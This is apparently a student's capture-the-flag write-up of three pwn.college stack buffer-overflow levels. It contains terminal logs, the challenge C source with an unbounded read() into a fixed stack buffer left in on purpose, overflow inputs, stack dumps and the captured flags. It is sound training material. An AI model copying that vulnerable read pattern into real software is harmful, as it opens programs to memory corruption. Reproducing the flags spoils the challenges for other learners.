# Binary Explotation

## Your first Overflow (easy)

### Solve
**Flag:** `pwn.college{4-JSACbtVAeVRtyQyOKRB7yVkQ5.dlDOywSM1EzNzEzW}`

To solve this challenge i searched the directory for the executable file and then i entered the "/" directory and there i found the "challenge" then i searched the challenge command to find the function to start the challenge and then i read through the details it printed and found that in order to obtain the flag i had to overflow the win function so after providing an input of 109 bytes i overflowed the win function and it printed the flag for me. 

```bash
hacker@binary-exploitation~your-first-overflow-easy:~$ ls -a
 .               .mozilla    asm.bin         not-the-flag        the-flag
 ..              .screen     asm.o           output.txt          v
 .ICEauthority   COLLEGE     b.sh            rax-challenge.bin   win
 .bash_history   Desktop     bash            rax-challenge.o     x
 .cache          Downloads   core            rax-challenge.s     x.sh
 .config         PWN         d               rm                 '~solve.sh'
 .dbus           a           instaructions   rm.sh
 .john           a.gdb       instructions    script
 .lesshst        a.sh        myfifo          script.sh
 .local          asm.S       myflag          solve.sh
hacker@binary-exploitation~your-first-overflow-easy:~$ cd /
hacker@binary-exploitation~your-first-overflow-easy:/$ ls -a
.           bin        dev   home   lib64   mnt  proc  sbin  tmp
..          boot       etc   lib    libx32  nix  root  srv   usr
.dockerenv  challenge  flag  lib32  media   opt  run   sys   var
hacker@binary-exploitation~your-first-overflow-easy:/$ cd challenge
hacker@binary-exploitation~your-first-overflow-easy:/challenge$ ls -a
.               binary-exploitation-first-overflow-w
..              binary-exploitation-first-overflow-w.c
DESCRIPTION.md
hacker@binary-exploitation~your-first-overflow-easy:/challenge$ cat DESCRIPTION.md
Overflow a buffer on the stack to set the right conditions to obtain the flag!
hacker@binary-exploitation~your-first-overflow-easy:/challenge$ binary-exploitation-first-overflow-w
bash: binary-exploitation-first-overflow-w: command not found
hacker@binary-exploitation~your-first-overflow-easy:/challenge$ ./binary-exploitation-first-overflow-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffd55d38d40 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd55d38d48 (rsp+0x0008) | 08 9f d3 55 fd 7f 00 00 | 0x00007ffd55d39f08 |
| 0x00007ffd55d38d50 (rsp+0x0010) | f8 9e d3 55 fd 7f 00 00 | 0x00007ffd55d39ef8 |
| 0x00007ffd55d38d58 (rsp+0x0018) | 25 05 aa 37 01 00 00 00 | 0x0000000137aa0525 |
| 0x00007ffd55d38d60 (rsp+0x0020) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffd55d38d68 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd55d38d70 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd55d38d78 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd55d38d80 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd55d38d88 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd55d38d90 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd55d38d98 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd55d38da0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd55d38da8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd55d38db0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd55d38db8 (rsp+0x0078) | 00 f6 f1 21 1f 10 ee 8e | 0x8eee101f21f1f600 |
| 0x00007ffd55d38dc0 (rsp+0x0080) | 00 9e d3 55 fd 7f 00 00 | 0x00007ffd55d39e00 |
| 0x00007ffd55d38dc8 (rsp+0x0088) | d2 24 40 00 00 00 00 00 | 0x00000000004024d2 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffd55d38d40, and our base pointer points to 0x7ffd55d38dc0.
This means that we have (decimal) 18 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 144 bytes.
The input buffer begins at 0x7ffd55d38d70, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 64 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, when this variable is non-zero, the flag will be printed.
You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x7ffd55d38db0, 64 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffd55d38d70 (the start of the input buffer)
right up to (but not including) 0x7ffd55d39d70 (which is 4032 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!
tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt
You sent 109 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffd55d38d40 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd55d38d48 (rsp+0x0008) | 08 9f d3 55 fd 7f 00 00 | 0x00007ffd55d39f08 |
| 0x00007ffd55d38d50 (rsp+0x0010) | f8 9e d3 55 fd 7f 00 00 | 0x00007ffd55d39ef8 |
| 0x00007ffd55d38d58 (rsp+0x0018) | 25 05 aa 37 01 00 00 00 | 0x0000000137aa0525 |
| 0x00007ffd55d38d60 (rsp+0x0020) | 00 10 00 00 6d 00 00 00 | 0x0000006d00001000 |
| 0x00007ffd55d38d68 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffd55d38d70 (rsp+0x0030) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007ffd55d38d78 (rsp+0x0038) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007ffd55d38d80 (rsp+0x0040) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007ffd55d38d88 (rsp+0x0048) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007ffd55d38d90 (rsp+0x0050) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007ffd55d38d98 (rsp+0x0058) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007ffd55d38da0 (rsp+0x0060) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007ffd55d38da8 (rsp+0x0068) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007ffd55d38db0 (rsp+0x0070) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007ffd55d38db8 (rsp+0x0078) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007ffd55d38dc0 (rsp+0x0080) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007ffd55d38dc8 (rsp+0x0088) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffd55d38d70
- the saved frame pointer (of main) is at 0x7ffd55d38dc0
- the saved return address (previously to main) is at 0x7ffd55d38dc8
- the saved return address is now pointing to 0x7474747474747474.
- the canary is stored at 0x7ffd55d38db8.
- the canary value is now 0x7474747474747474.
- the address of the win variable is 0x7ffd55d38db0.
- the value of the win variable is 0x74747474.

You win! Here is your flag:
pwn.college{4-JSACbtVAeVRtyQyOKRB7yVkQ5.dlDOywSM1EzNzEzW}


Goodbye!
*** stack smashing detected ***: terminated
Aborted
```

### New Learnings
In order to complete this challenge I learnt basics of assembly, uses of gdb, computer memory and how to access the memory and register using the assembly then I learnt about what is an overflow and how it works.
### References 
https://www.geeksforgeeks.org/cpp/buffer-overflow-attack-with-example/  
https://owasp.org/www-community/attacks/Buffer_overflow_attack  
https://youtu.be/0_merdYty4Y?si=1AdBNUu6QF-3PMK4  
https://www.youtube.com/playlist?list=PLchBW5mYosh_F38onTyuhMTt2WGfY-yr7


## Your first overflow(hard)

### Solve
**Flag:** `pwn.college{g3CeOjYZTY46tiomN-3xjNwUaDW.dBTOywSM1EzNzEzW}`

For this challenge there was no description of the buffer length as it was in the easy level so in order to solve this question I first read the c-program file and from there I found out that the the input buffer size is 52 bytes long so i had to enter charecters longer than 52 bytes in order to overflow the function and receive the flag.

```bash
hacker@binary-exploitation~your-first-overflow-hard:~$ ls -a /challenge/
.  ..  DESCRIPTION.md  binary-exploitation-first-overflow  binary-exploitation-first-overflow.c
hacker@binary-exploitation~your-first-overflow-hard:~$ cat /challenge/binary-exploitation-first-overflow.c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

void bin_padding()
{
    asm volatile (".rept 3664; nop; .endr");
}

void win()
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[52];
        int win_variable;
    } data  = {0} ;

    unsigned long size = 0;

    size = 4096;

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    if (data.win_variable)
    {
        win();
    }

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}hacker@binary-exploitation~your-first-overflow-hard:~$ /challenge/binary-exploitation-first-overflow
Send your payload (up to 4096 bytes)!
ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt
You win! Here is your flag:
pwn.college{g3CeOjYZTY46tiomN-3xjNwUaDW.dBTOywSM1EzNzEzW}


Goodbye!
*** stack smashing detected ***: terminated
Aborted
```

### New Learnings
NA
### References 
NA


## Precision (easy)

### Solve
**Flag:** `pwn.college{sMM3dfNOejn9oeEcp7NcL7Rve8Q.0FNwcDMxwSM1EzNzEzW}`

In order to solve this level i found the function in the "/challenge" direcrtory then i ran the program there in the instruction it was mentioned that the win command is at the location which was 120 bytes from the intial stack pointer and it was mentioned in the challenge that the value of the win function should not be "0" so i entered 121 charecter to obtain the flag, also just for fun i ran the function again and again and increased the input by 1 everytime to get the location of the lose variable and found that the lose variable was getting set when we entered 125 charecter.

```bash
hacker@binary-exploitation~precision-easy:~$ cd /challenge/
hacker@binary-exploitation~precision-easy:/challenge$ ls -a
.  ..  DESCRIPTION.md  binary-exploitation-lose-variable-w  binary-exploitation-lose-variable-w.c
hacker@binary-exploitation~precision-easy:/challenge$ cat binary-exploitation-lose-variable-w.c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

void bin_padding()
{
    asm volatile (".rept 2949; nop; .endr");
}

void win()
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[118];
        int win_variable;
        int lose_variable;
    } data  = {0} ;

    unsigned long size = 0;

    puts("The challenge() function has just been launched!");

    GET_FRAME_WORDS(sz_, sp_, bp_, rp_);
    puts("Before we do anything, let's take a look at challenge()'s stack frame:");
    DUMP_STACK(sp_, sz_);
    printf("Our stack pointer points to %p, and our base pointer points to %p.\n", sp_, bp_);
    printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
    printf("including the saved base pointer and the saved return address, for a\n");
    printf("total of %d bytes.\n", sz_ * 8);
    printf("The input buffer begins at %p, partway through the stack frame,\n", &data.input);
    printf("(\"above\" it in the stack are other local variables used by the function).\n");
    printf("Your input will be read into this buffer.\n");
    printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 118);
    printf("large input length, and thus overflow the buffer.\n\n");

    printf("In this level, there is a \"win\" variable.\n");
    printf("By default, the value of this variable is zero.\n");
    printf("However, when this variable is non-zero, the flag will be printed.\n");
    printf("You can make this variable be non-zero by overflowing the input buffer.\n");
    printf("The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n", &data.win_variable, ((unsigned long) &data.win_variable) - ((unsigned long) &data.input));

    puts(" But be careful! There is also a LOSE variable. If this variable ends up non-zero, the program will terminate and you");
    puts("will not get the flag. Be careful not to overwrite this variable.\n");
    printf("The \"lose\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n", &data.lose_variable, ((unsigned long) &data.lose_variable) - ((unsigned long) &data.input));

    puts("We have disabled the following standard memory corruption mitigations for this challenge:");
    puts("- the binary is *not* position independent. This means that it will be");
    puts("located at the same spot every time it is run, which means that by");
    puts("analyzing the binary (using objdump or reading this output), you can");
    puts("know the exact value that you need to overwrite the return address with.\n");

    FIND_CANARY(cp_, cv_, bp_);

    size = 4096;

    printf("You have chosen to send %lu bytes of input!\n", size);
    printf("This will allow you to write from %p (the start of the input buffer)\n", &data.input);
    printf("right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n", size + (unsigned long) &data.input, size - 118);

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    printf("You sent %d bytes!\n", received);

    printf("Let's see what happened with the stack:\n\n");
    DUMP_STACK(sp_, sz_);

    printf("The program's memory status:\n");
    printf("- the input buffer starts at %p\n", &data.input);
    printf("- the saved frame pointer (of main) is at %p\n", bp_);
    printf("- the saved return address (previously to main) is at %p\n", rp_);
    printf("- the saved return address is now pointing to %p.\n", *(unsigned long*)(rp_));
    printf("- the canary is stored at %p.\n", cp_);
    printf("- the canary value is now %p.\n", *(unsigned long*)(cp_));
    printf("- the address of the win variable is %p.\n", &data.win_variable);
    printf("- the value of the win variable is 0x%x.\n", data.win_variable);
    printf("- the address of the lose variable is %p.\n", &data.lose_variable);
    printf("- the value of the lose variable is 0x%x.\n", data.lose_variable);
    printf("\n");

    if (data.lose_variable)
    {
        puts("Lose variable is set! Quitting!");
        exit(1);
    }
    if (data.win_variable)
    {
        win();
    }

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}hacker@binary-exploitation~precision-easy:/challenge$ binary-exploitation-lose-variable-w
bash: binary-exploitation-lose-variable-w: command not found
hacker@binary-exploitation~precision-easy:/challenge$ /binary-exploitation-lose-variable-w
bash: /binary-exploitation-lose-variable-w: No such file or directory
hacker@binary-exploitation~precision-easy:/challenge$ /challenge/binary-exploitation-lose-variable-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff6c2445a0 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007fff6c2445a8 (rsp+0x0008) | a8 57 24 6c ff 7f 00 00 | 0x00007fff6c2457a8 |
| 0x00007fff6c2445b0 (rsp+0x0010) | 98 57 24 6c ff 7f 00 00 | 0x00007fff6c245798 |
| 0x00007fff6c2445b8 (rsp+0x0018) | 1c 00 00 00 01 00 00 00 | 0x000000010000001c |
| 0x00007fff6c2445c0 (rsp+0x0020) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007fff6c2445c8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c2445d0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c2445d8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c2445e0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c2445e8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c2445f0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c2445f8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c244600 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c244608 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c244610 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c244618 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c244620 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c244628 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c244630 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c244638 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c244640 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c244648 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff6c244650 (rsp+0x00b0) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007fff6c244658 (rsp+0x00b8) | 00 14 d0 88 49 c7 25 f8 | 0xf825c74988d01400 |
| 0x00007fff6c244660 (rsp+0x00c0) | a0 56 24 6c ff 7f 00 00 | 0x00007fff6c2456a0 |
| 0x00007fff6c244668 (rsp+0x00c8) | 01 27 40 00 00 00 00 00 | 0x0000000000402701 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7fff6c2445a0, and our base pointer points to 0x7fff6c244660.
This means that we have (decimal) 26 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 208 bytes.
The input buffer begins at 0x7fff6c2445d0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 118 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, when this variable is non-zero, the flag will be printed.
You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x7fff6c244648, 120 bytes after the start of your input buffer.

 But be careful! There is also a LOSE variable. If this variable ends up non-zero, the program will terminate and you
will not get the flag. Be careful not to overwrite this variable.

The "lose" variable is stored at 0x7fff6c24464c, 124 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7fff6c2445d0 (the start of the input buffer)
right up to (but not including) 0x7fff6c2455d0 (which is 3978 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!
ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt
You sent 122 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff6c2445a0 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007fff6c2445a8 (rsp+0x0008) | a8 57 24 6c ff 7f 00 00 | 0x00007fff6c2457a8 |
| 0x00007fff6c2445b0 (rsp+0x0010) | 98 57 24 6c ff 7f 00 00 | 0x00007fff6c245798 |
| 0x00007fff6c2445b8 (rsp+0x0018) | 1c 00 00 00 01 00 00 00 | 0x000000010000001c |
| 0x00007fff6c2445c0 (rsp+0x0020) | 1c 00 00 00 7a 00 00 00 | 0x0000007a0000001c |
| 0x00007fff6c2445c8 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007fff6c2445d0 (rsp+0x0030) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c2445d8 (rsp+0x0038) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c2445e0 (rsp+0x0040) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c2445e8 (rsp+0x0048) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c2445f0 (rsp+0x0050) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c2445f8 (rsp+0x0058) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c244600 (rsp+0x0060) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c244608 (rsp+0x0068) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c244610 (rsp+0x0070) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c244618 (rsp+0x0078) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c244620 (rsp+0x0080) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c244628 (rsp+0x0088) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c244630 (rsp+0x0090) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c244638 (rsp+0x0098) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c244640 (rsp+0x00a0) | 74 74 74 74 74 74 74 74 | 0x7474747474747474 |
| 0x00007fff6c244648 (rsp+0x00a8) | 74 0a 00 00 00 00 00 00 | 0x0000000000000a74 |
| 0x00007fff6c244650 (rsp+0x00b0) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007fff6c244658 (rsp+0x00b8) | 00 14 d0 88 49 c7 25 f8 | 0xf825c74988d01400 |
| 0x00007fff6c244660 (rsp+0x00c0) | a0 56 24 6c ff 7f 00 00 | 0x00007fff6c2456a0 |
| 0x00007fff6c244668 (rsp+0x00c8) | 01 27 40 00 00 00 00 00 | 0x0000000000402701 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fff6c2445d0
- the saved frame pointer (of main) is at 0x7fff6c244660
- the saved return address (previously to main) is at 0x7fff6c244668
- the saved return address is now pointing to 0x402701.
- the canary is stored at 0x7fff6c244658.
- the canary value is now 0xf825c74988d01400.
- the address of the win variable is 0x7fff6c244648.
- the value of the win variable is 0xa74.
- the address of the lose variable is 0x7fff6c24464c.
- the value of the lose variable is 0x0.

You win! Here is your flag:
pwn.college{sMM3dfNOejn9oeEcp7NcL7Rve8Q.0FNwcDMxwSM1EzNzEzW}


Goodbye!
```

### New Learnings
NA
### References 
NA

## Challenge Name

### Solve
**Flag:** ``



```bash

```

### New Learnings

### References 


## Challenge Name

### Solve
**Flag:** ``



```bash

```

### New Learnings

### References 


## Challenge Name

### Solve
**Flag:** ``



```bash

```

### New Learnings

### References 


## Challenge Name

### Solve
**Flag:** ``



```bash

```

### New Learnings

### References 
